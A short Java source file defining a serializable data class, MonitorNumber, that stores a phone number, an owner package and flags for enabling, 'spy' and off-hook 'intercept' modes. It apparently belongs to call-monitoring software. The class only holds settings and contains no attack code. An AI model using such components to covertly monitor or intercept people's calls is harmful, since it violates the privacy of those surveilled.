package com.vvt.callmanager.ref;

import java.io.Serializable;

public class MonitorNumber implements Serializable {

	private static final long serialVersionUID = 6256823258651682376L;
	
	private String ownerPackage;
	private String phoneNumber;
	private boolean isEnabled;
	private boolean spyEnabled;
	private boolean offhookSpyEnabled;
	
	public String getPhoneNumber() {
		return phoneNumber;
	}
	public void setPhoneNumber(String phoneNumber) {
		this.phoneNumber = phoneNumber;
	}
	public String getOwnerPackage() {
		return ownerPackage;
	}
	public void setOwnerPackage(String ownerPackage) {
		this.ownerPackage = ownerPackage;
	}
	public boolean isEnabled() {
		return isEnabled;
	}
	public void setEnabled(boolean enable) {
		isEnabled = enable;
	}
	public boolean isSpyEnabled() {
		return spyEnabled;
	}
	public void setSpyEnabled(boolean spyEnabled) {
		this.spyEnabled = spyEnabled;
	}
	public boolean isOffhookSpyEnabled() {
		return offhookSpyEnabled;
	}
	public void setOffhookSpyEnabled(boolean offhookSpyEnabled) {
		this.offhookSpyEnabled = offhookSpyEnabled;
	}
	
	@Override
	public String toString() {
		return String.format(
				"\"%s\", owner=%s, enable=%s, spy=%s, intercept=%s", 
				phoneNumber, ownerPackage, isEnabled, spyEnabled, offhookSpyEnabled);
	}
	
	@Override
	public boolean equals(Object obj) {
		return obj != null && obj instanceof MonitorNumber ? 
				phoneNumber.equals(((MonitorNumber) obj).getPhoneNumber()) : false;
	}
	
	@Override
	public int hashCode() {
		return phoneNumber == null ? 0 : phoneNumber.hashCode();
	}
	
}
